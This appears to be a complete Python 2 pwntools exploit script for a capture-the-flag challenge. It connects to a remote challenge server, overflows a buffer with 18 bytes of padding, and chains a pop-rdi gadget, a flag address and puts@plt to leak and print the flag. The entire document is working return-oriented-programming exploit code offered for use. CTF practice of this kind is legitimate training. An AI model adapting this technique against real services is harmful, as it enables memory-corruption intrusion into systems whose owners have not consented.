from pwn import *

r = remote('challs.xmas.htsp.ro', 12006)

offset = 18
puts_plt = 0x401030
flag_addr = 0x402010
pop_rdi = 0x401273

payload = ""
payload += "A"*18
payload += p64(pop_rdi)
payload += p64(flag_addr)
payload += p64(puts_plt)

r.recvuntil('snowmen?')
r.sendline(payload)

r.recvline()
r.recvline()
print "Flag: {}".format(r.recvline().strip())
